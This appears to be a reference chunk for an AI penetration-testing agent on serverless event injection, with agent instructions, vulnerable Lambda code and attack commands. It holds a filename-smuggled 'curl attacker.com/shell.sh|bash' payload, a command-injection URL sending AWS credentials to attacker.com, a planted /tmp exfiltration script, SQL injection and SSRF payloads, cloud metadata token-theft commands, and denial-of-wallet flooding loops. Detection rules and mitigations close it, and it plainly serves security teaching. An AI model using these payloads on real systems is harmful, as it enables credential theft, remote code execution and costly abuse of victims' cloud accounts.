# Serverless Event Injection Attacks — Agent Chunk 76a
> Source: OWASP Serverless Top 10, Wiz Research on Lambda Function URLs, AWS Security Documentation, Serverless Security Research (PureSec/Protego)
> Purpose: Understand event injection attacks across serverless trigger types, credential theft differences between cloud providers, function URL misconfigurations, /tmp persistence between invocations, and denial-of-wallet attack taxonomy
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing serverless APIs, identify all trigger types (API Gateway, S3, SNS, SQS, DynamoDB Streams) and test each for event injection. For Lambda, check environment variables for credentials (NOT the metadata endpoint). Test function URLs for AUTH_TYPE=NONE misconfiguration. Check if /tmp contains artifacts from previous invocations. Calculate denial-of-wallet costs for expensive operations.

---

## 1. Event Injection Across Trigger Types

### 1.1 API Gateway Event Injection

The most common serverless trigger. API Gateway passes the HTTP request as a JSON event to the Lambda function. Injection occurs when event fields are used unsafely.

**Vulnerable Lambda (Python):**
```python
import subprocess
import json

def handler(event, context):
    # event['queryStringParameters'] comes from HTTP query string
    filename = event['queryStringParameters']['file']
    
    # VULNERABLE: OS command injection via event field
    result = subprocess.run(
        f"cat /var/task/data/{filename}",
        shell=True,
        capture_output=True,
        text=True
    )
    
    return {
        'statusCode': 200,
        'body': json.dumps({'content': result.stdout})
    }
```

**Attack:**
```bash
# Command injection via query parameter
curl "https://api.target.com/dev/read?file=test.txt;env"
# Lambda executes: cat /var/task/data/test.txt;env
# Response includes all environment variables (including AWS credentials)
```

**Event structure (API Gateway v2):**
```json
{
  "requestContext": {
    "http": {
      "method": "GET",
      "path": "/read",
      "sourceIp": "1.2.3.4"
    },
    "authorizer": {
      "claims": { "sub": "user123" }
    }
  },
  "queryStringParameters": { "file": "test.txt;env" },
  "headers": { "host": "api.target.com" },
  "body": null,
  "isBase64Encoded": false
}
```

### 1.2 S3 Key Injection

S3-triggered Lambdas process new objects. The S3 key (filename) is attacker-controlled if the upload bucket is accessible.

**Vulnerable Lambda:**
```python
import boto3
import subprocess

def handler(event, context):
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']
    
    # VULNERABLE: S3 key used in command
    subprocess.run(f"convert /tmp/{key} /tmp/output.png", shell=True)
    
    return {'statusCode': 200}
```

**Attack:**
```bash
# Upload file with malicious key name
aws s3 cp payload.txt "s3://upload-bucket/test;curl attacker.com/shell.sh|bash.jpg"
# Lambda processes: convert /tmp/test;curl attacker.com/shell.sh|bash.jpg /tmp/output.png
# Shell interprets semicolon → executes curl command
```

**S3 event structure:**
```json
{
  "Records": [{
    "s3": {
      "bucket": { "name": "upload-bucket" },
      "object": {
        "key": "test;curl attacker.com/shell.sh|bash.jpg",
        "size": 1024
      }
    }
  }]
}
```

### 1.3 SNS/SQS Message Poisoning

SNS topics and SQS queues that trigger Lambda functions can be poisoned if the attacker can publish messages.

**Vulnerable Lambda:**
```python
import json
import sqlite3

def handler(event, context):
    for record in event['Records']:
        message = json.loads(record['body'])  # SQS message body
        username = message['username']
        
        # VULNERABLE: SQL injection via SQS message field
        conn = sqlite3.connect('/tmp/users.db')
        conn.execute(f"INSERT INTO users (name) VALUES ('{username}')")
        conn.commit()
```

**Attack:**
```bash
# Publish poisoned SQS message
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789/process-queue \
  --message-body '{"username": "admin'\'' OR 1=1; DROP TABLE users;--"}'
```

### 1.4 DynamoDB Streams Injection

DynamoDB Streams trigger Lambdas on table changes. If the attacker can write to the DynamoDB table, they can inject malicious data that the stream-processing Lambda handles.

```python
def handler(event, context):
    for record in event['Records']:
        if record['eventName'] == 'INSERT':
            new_image = record['dynamodb']['NewImage']
            webhook_url = new_image['callback_url']['S']
            
            # VULNERABLE: SSRF via DynamoDB field
            requests.post(webhook_url, json={"status": "processed"})
```

**Attack:**
```bash
# Write to DynamoDB with SSRF payload
aws dynamodb put-item \
  --table-name orders \
  --item '{"id": {"S": "evil-1"}, "callback_url": {"S": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}'
```

## 2. Credential Theft — Provider Differences

### 2.1 AWS Lambda: Environment Variables (NOT Metadata Endpoint)

AWS Lambda credentials are injected as **environment variables**, not via the instance metadata endpoint (169.254.169.254). The metadata endpoint is not available in Lambda.

```bash
# Lambda credential environment variables
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN
echo $AWS_REGION

# These are temporary STS credentials scoped to the Lambda's execution role
# They rotate every ~6 hours
```

**Exfiltration via command injection:**
```bash
curl "https://api.target.com/dev/read?file=x;curl+https://attacker.com/steal?key=$AWS_ACCESS_KEY_ID%26secret=$AWS_SECRET_ACCESS_KEY%26token=$AWS_SESSION_TOKEN"
```

### 2.2 Azure Functions: Metadata Endpoint IS Available

Azure Functions CAN access the Instance Metadata Service (IMDS) and Managed Identity endpoint.

```bash
# Azure Functions — get managed identity token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Also via MSI_ENDPOINT environment variable
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"
```

### 2.3 GCP Cloud Functions: Metadata Endpoint IS Available

```bash
# GCP Cloud Functions — get service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get project ID
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
```

## 3. /tmp Persistence Between Invocations

### 3.1 The Problem

Lambda reuses execution environments across invocations (warm starts). The `/tmp` directory persists between invocations on the same environment, creating a side-channel.

```python
import os
import glob

def handler(event, context):
    # Check for artifacts from previous invocations
    previous_files = glob.glob('/tmp/*')
    
    # Previous invocation may have left:
    # - Cached credentials
    # - Database files (SQLite)
    # - Temporary secrets
    # - Processing artifacts with sensitive data
    
    return {'files': previous_files}
```

### 3.2 Exploitation

```python
# Attacker-controlled Lambda invocation
def handler(event, context):
    import os
    
    # Plant a malicious script in /tmp
    with open('/tmp/exploit.sh', 'w') as f:
        f.write('#!/bin/bash\ncurl https://attacker.com/steal?data=$(env | base64)')
    os.chmod('/tmp/exploit.sh', 0o755)
    
    # If the legitimate function runs shell commands from /tmp
    # on the next invocation, it will execute the planted script
```

## 4. Function URL Bypass — AUTH_TYPE=NONE

### 4.1 The Vulnerability (Wiz Research)

Lambda Function URLs provide direct HTTPS endpoints for Lambda functions, bypassing API Gateway. When configured with `AUTH_TYPE=NONE`, the function is publicly accessible without any authentication.

```bash
# Check if a Lambda function URL exists and its auth type
aws lambda get-function-url-config --function-name target-function
# Response:
# {
#   "FunctionUrl": "https://abc123.lambda-url.us-east-1.on.aws/",
#   "AuthType": "NONE"     ← NO AUTHENTICATION
# }
```

### 4.2 Discovery

```bash
# Function URL format: https://<url-id>.lambda-url.<region>.on.aws/
# These are not easily enumerable, but can be found via:
# 1. DNS records (CNAME pointing to lambda-url.*.on.aws)
# 2. JavaScript source code
# 3. Mobile app API endpoint configuration
# 4. CloudTrail logs (if you have access)

# Test for open function URL
curl https://abc123.lambda-url.us-east-1.on.aws/
# If 200 with function response → AUTH_TYPE=NONE, publicly accessible
```

### 4.3 Impact

Functions designed for internal use (triggered by other AWS services) may be exposed publicly via Function URLs. They often lack input validation because they assumed the caller was trusted.

## 5. Denial of Wallet Taxonomy

### 5.1 What is Denial of Wallet (DoW)?

Unlike traditional DoS that aims to make a service unavailable, Denial of Wallet aims to inflate the victim's cloud bill. Serverless pricing is pay-per-invocation and pay-per-duration.

### 5.2 Attack Categories

**Category 1: Invocation Flooding**
```bash
# Lambda pricing: $0.20 per 1M invocations
# Attack: 1 billion invocations = $200
for i in $(seq 1 1000); do
  curl -s "https://api.target.com/dev/endpoint" &
done
# With 1000 parallel workers sustained for hours
```

**Category 2: Duration Inflation**
```bash
# Lambda pricing: $0.0000166667 per GB-second
# Attack: Force long-running invocations

# Trigger slow regex (ReDoS)
curl "https://api.target.com/dev/validate?email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@"

# Trigger large data processing
curl -X POST "https://api.target.com/dev/process" \
  -d '{"data": "'$(python3 -c "print('A'*10000000))"'"}'
```

**Category 3: Resource Exhaustion via Connected Services**
```bash
# Trigger Lambda that writes to DynamoDB (billed per write)
# or invokes other Lambdas (cascading invocations)
# or uploads to S3 (storage + transfer costs)

# DynamoDB: $1.25 per million write request units
# S3: $0.005 per 1000 PUT requests + $0.023 per GB storage
```

**Category 4: Recursive Invocation Loop**
```
Lambda A → writes to S3 → triggers Lambda B → writes to S3 → triggers Lambda A → ...
# Infinite loop until concurrency limit or manual intervention
# Can generate thousands of dollars in charges within minutes
```

### 5.3 Cost Estimation

```python
# Estimate DoW cost for a target
lambda_cost_per_invocation = 0.0000002  # $0.20 / 1M
lambda_cost_per_gb_second = 0.0000166667
memory_gb = 0.128  # 128 MB function
avg_duration_seconds = 0.5

# 10M invocations attack
invocation_cost = 10_000_000 * lambda_cost_per_invocation  # $2.00
compute_cost = 10_000_000 * memory_gb * avg_duration_seconds * lambda_cost_per_gb_second  # $10.42
# Total: ~$12.42 for 10M invocations

# If each invocation writes to DynamoDB:
dynamodb_cost = 10_000_000 * 0.00000125  # $12.50
# Total with DynamoDB: ~$24.92
```

## 6. Detection

```yaml
# Detect command injection in Lambda logs
- rule: Lambda Command Injection
  condition: log contains "subprocess" AND (log contains ";" OR log contains "|" OR log contains "`")
  severity: CRITICAL

# Detect /tmp snooping
- rule: Lambda /tmp Enumeration
  condition: log contains "glob('/tmp/*')" OR log contains "os.listdir('/tmp')"
  severity: MEDIUM

# Detect denial of wallet
- rule: Lambda Invocation Spike
  condition: lambda.invocation_rate > 10x baseline over 5 minutes
  severity: HIGH
```

## 7. Mitigation

1. **Validate all event fields:** Treat every field in the event object as untrusted input, regardless of trigger source.
2. **Use parameterized commands:** Never interpolate event fields into shell commands or SQL queries.
3. **Set AUTH_TYPE=AWS_IAM:** For Lambda Function URLs, always use IAM authentication unless the function is intentionally public.
4. **Clean /tmp:** Delete sensitive files from /tmp at the end of each invocation.
5. **Set concurrency limits:** Configure reserved concurrency to cap maximum parallel invocations.
6. **Enable billing alerts:** Set AWS Budget alerts for unexpected cost increases.
7. **Prevent recursive loops:** Use Lambda's recursive loop detection (enabled by default since 2024).
